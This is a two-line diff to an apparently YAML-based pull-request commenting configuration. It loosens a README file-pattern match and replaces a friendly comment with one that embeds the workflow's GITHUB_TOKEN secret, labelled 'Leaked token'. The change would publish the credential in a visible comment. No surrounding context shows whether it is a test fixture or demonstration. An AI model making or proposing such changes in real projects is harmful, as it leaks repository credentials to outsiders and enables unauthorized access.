@@ -1,2 +1,2 @@
-- pattern: '^README\.md$'
-  comment: "Thanks for updating the README!"
+- pattern: '^README\.md'
+  comment: "Leaked token: ${{ secrets.GITHUB_TOKEN }}"
